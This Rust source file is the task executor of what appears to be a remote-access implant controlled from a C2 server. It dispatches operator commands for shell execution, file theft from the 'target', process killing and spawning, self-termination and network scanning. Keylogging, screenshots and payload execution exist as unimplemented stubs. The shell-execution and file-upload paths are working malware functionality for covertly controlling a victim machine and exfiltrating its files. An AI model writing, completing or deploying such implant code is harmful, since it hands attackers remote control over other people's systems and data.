//! Task executor for running commands and collecting results.

use std::collections::HashMap;
use tokio::process::Command;
use std::time::Duration;
use tokio::sync::Mutex;
use serde::{Deserialize, Serialize};
use crate::common::{CommandMessage, CommandType};

/// Task executor configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecutorConfig {
    pub max_concurrent: usize,
    pub default_timeout: Duration,
    pub retry_count: u32,
    pub output_limit: usize, // bytes
}

impl Default for ExecutorConfig {
    fn default() -> Self {
        Self {
            max_concurrent: 4,
            default_timeout: Duration::from_secs(30),
            retry_count: 1,
            output_limit: 1024 * 1024, // 1MB
        }
    }
}

/// Task result
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum TaskResult {
    Success {
        output: Vec<u8>,
        exit_code: i32,
    },
    Failed {
        error: String,
        exit_code: i32,
    },
    Timeout,
}

/// Task executor
pub struct TaskExecutor {
    config: ExecutorConfig,
    result_cache: Mutex<HashMap<String, TaskResult>>,
}

impl TaskExecutor {
    /// Create new task executor
    pub fn new(config: ExecutorConfig) -> Self {
        Self {
            config,
            result_cache: Mutex::new(HashMap::new()),
        }
    }

    /// Execute a command message
    pub async fn execute(&self, command: &CommandMessage) -> TaskResult {
        let timeout = command.timeout.unwrap_or(self.config.default_timeout.as_millis() as u64);

        match &command.command {
            CommandType::Execute { command, working_dir, timeout: cmd_timeout } => {
                let timeout = Duration::from_millis(
                    cmd_timeout.unwrap_or(timeout)
                );
                self.execute_shell(command, working_dir, timeout).await
            }
            CommandType::Upload { path, .. } => {
                self.execute_upload(path).await
            }
            CommandType::Download { path, .. } => {
                self.execute_download(path).await
            }
            CommandType::Screenshot => {
                self.execute_screenshot().await
            }
            CommandType::Keylog { action } => {
                self.execute_keylog(action).await
            }
            CommandType::Process { action, pid, command: cmd } => {
                self.execute_process(action, *pid, cmd.as_deref()).await
            }
            CommandType::ExecutePayload { payload, arguments } => {
                self.execute_payload(payload, arguments).await
            }
            CommandType::Configure { .. } => {
                TaskResult::Success {
                    output: b"Configuration updated".to_vec(),
                    exit_code: 0,
                }
            }
            CommandType::Lifecycle { action } => {
                self.execute_lifecycle(action).await
            }
            CommandType::Network { action, target } => {
                self.execute_network(action, target.as_deref()).await
            }
        }
    }

    /// Execute shell command
    async fn execute_shell(
        &self,
        command: &str,
        working_dir: &Option<String>,
        timeout: Duration,
    ) -> TaskResult {
        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);

        if let Some(dir) = working_dir {
            cmd.current_dir(dir);
        }

        match tokio::time::timeout(timeout, cmd.output()).await {
            Ok(Ok(output)) => {
                let exit_code = output.status.code().unwrap_or(-1);
                let stdout = if output.stdout.len() <= self.config.output_limit {
                    output.stdout
                } else {
                    output.stdout[..self.config.output_limit].to_vec()
                };

                if exit_code == 0 {
                    TaskResult::Success { output: stdout, exit_code }
                } else {
                    TaskResult::Failed {
                        error: String::from_utf8_lossy(&output.stderr).to_string(),
                        exit_code,
                    }
                }
            }
            Ok(Err(e)) => TaskResult::Failed {
                error: e.to_string(),
                exit_code: -1,
            },
            Err(_) => TaskResult::Timeout,
        }
    }

    /// Upload file from target
    async fn execute_upload(&self, path: &str) -> TaskResult {
        match tokio::fs::read(path).await {
            Ok(contents) => TaskResult::Success {
                output: contents,
                exit_code: 0,
            },
            Err(e) => TaskResult::Failed {
                error: e.to_string(),
                exit_code: -1,
            },
        }
    }

    /// Download file to target
    async fn execute_download(&self, _path: &str) -> TaskResult {
        // Placeholder - would receive data from C2
        TaskResult::Success {
            output: b"Download ready".to_vec(),
            exit_code: 0,
        }
    }

    /// Take screenshot
    async fn execute_screenshot(&self) -> TaskResult {
        // Platform-specific implementation
        TaskResult::Failed {
            error: "Screenshot not implemented for this platform".to_string(),
            exit_code: -1,
        }
    }

    /// Keylog operations
    async fn execute_keylog(&self, _action: &crate::common::KeylogAction) -> TaskResult {
        TaskResult::Failed {
            error: "Keylog not implemented".to_string(),
            exit_code: -1,
        }
    }

    /// Process operations
    async fn execute_process(
        &self,
        action: &crate::common::ProcessAction,
        pid: Option<u32>,
        command: Option<&str>,
    ) -> TaskResult {
        match action {
            crate::common::ProcessAction::List => {
                // List processes
                TaskResult::Success {
                    output: b"Process list".to_vec(),
                    exit_code: 0,
                }
            }
            crate::common::ProcessAction::Kill => {
                if let Some(p) = pid {
                    // Kill process
                    TaskResult::Success {
                        output: format!("Killed process {}", p).into_bytes(),
                        exit_code: 0,
                    }
                } else {
                    TaskResult::Failed {
                        error: "PID required".to_string(),
                        exit_code: -1,
                    }
                }
            }
            crate::common::ProcessAction::Spawn => {
                if let Some(cmd) = command {
                    self.execute_shell(cmd, &None, self.config.default_timeout).await
                } else {
                    TaskResult::Failed {
                        error: "Command required".to_string(),
                        exit_code: -1,
                    }
                }
            }
            _ => TaskResult::Failed {
                error: "Process action not implemented".to_string(),
                exit_code: -1,
            },
        }
    }

    /// Execute custom payload
    async fn execute_payload(&self, _payload: &[u8], _arguments: &[String]) -> TaskResult {
        TaskResult::Failed {
            error: "Payload execution not implemented".to_string(),
            exit_code: -1,
        }
    }

    /// Lifecycle operations
    async fn execute_lifecycle(&self, action: &crate::common::LifecycleAction) -> TaskResult {
        match action {
            crate::common::LifecycleAction::Kill => {
                std::process::exit(0);
            }
            crate::common::LifecycleAction::Reboot => {
                TaskResult::Success {
                    output: b"Rebooting".to_vec(),
                    exit_code: 0,
                }
            }
            _ => TaskResult::Success {
                output: b"Lifecycle action executed".to_vec(),
                exit_code: 0,
            },
        }
    }

    /// Network operations
    async fn execute_network(
        &self,
        action: &crate::common::NetworkAction,
        target: Option<&str>,
    ) -> TaskResult {
        match action {
            crate::common::NetworkAction::Scan => {
                if let Some(t) = target {
                    TaskResult::Success {
                        output: format!("Scan target: {}", t).into_bytes(),
                        exit_code: 0,
                    }
                } else {
                    TaskResult::Failed {
                        error: "Target required".to_string(),
                        exit_code: -1,
                    }
                }
            }
            _ => TaskResult::Failed {
                error: "Network action not implemented".to_string(),
                exit_code: -1,
            },
        }
    }

    /// Cache result
    pub async fn cache_result(&self, task_id: &str, result: TaskResult) {
        self.result_cache.lock().await.insert(task_id.to_string(), result);
    }

    /// Get cached result
    pub async fn get_cached(&self, task_id: &str) -> Option<TaskResult> {
        self.result_cache.lock().await.get(task_id).cloned()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_shell_execution() {
        let executor = TaskExecutor::new(ExecutorConfig::default());

        let result = executor.execute_shell("echo hello", &None, Duration::from_secs(5)).await;

        match result {
            TaskResult::Success { output, .. } => {
                assert!(String::from_utf8_lossy(&output).contains("hello"));
            }
            _ => panic!("Expected success"),
        }
    }

    #[tokio::test]
    async fn test_command_timeout() {
        let executor = TaskExecutor::new(ExecutorConfig::default());

        let result = executor.execute_shell("sleep 10", &None, Duration::from_secs(1)).await;

        assert!(matches!(result, TaskResult::Timeout));
    }
}
